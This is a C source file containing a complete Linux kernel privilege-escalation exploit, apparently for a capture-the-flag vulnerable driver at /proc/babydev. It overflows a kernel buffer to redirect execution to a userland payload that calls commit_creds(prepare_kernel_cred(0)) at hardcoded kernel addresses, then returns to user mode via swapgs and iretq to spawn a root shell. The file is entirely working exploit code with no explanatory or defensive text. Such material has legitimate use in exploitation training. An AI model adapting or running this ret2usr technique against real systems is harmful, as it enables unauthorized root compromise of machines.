#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

struct trap_frame{
        void *rip;
        uint64_t cs;
        uint64_t rflags;
        void *rsp;
        uint64_t ss;
};
struct trap_frame tf;

void launch_shell() {
        getuid();
        system("/bin/sh");
}

void prepare_tf(){
        asm(    "movq %%cs, %0\n"
                "movq %%ss, %1\n"
                "movq %%rsp, %3\n"
                "pushfq\n"
                "popq %2\n"
                : "=r"(tf.cs), "=r"(tf.ss), "=r"(tf.rflags), "=r"(tf.rsp) :: "memory"
        );
        tf.rip = &launch_shell;
        tf.rsp -= 1024;
}

#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void *) KERNCALL = (void *)0xffffffff81052830;
void *(*prepare_kernel_cred)(void *) KERNCALL = (void *)0xffffffff81052a60;

void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm(    "swapgs\n"
                "mov $tf,%rsp\n"
                "iretq\n"
        );
}

int main(){
        char buf[300]={0};
        memset(buf,'A',124);
        *(void **)(buf+124) = &payload;
        prepare_tf();

        int fd=open("/proc/babydev",O_WRONLY);
        write(fd,buf,sizeof(buf));
        return 0;
}
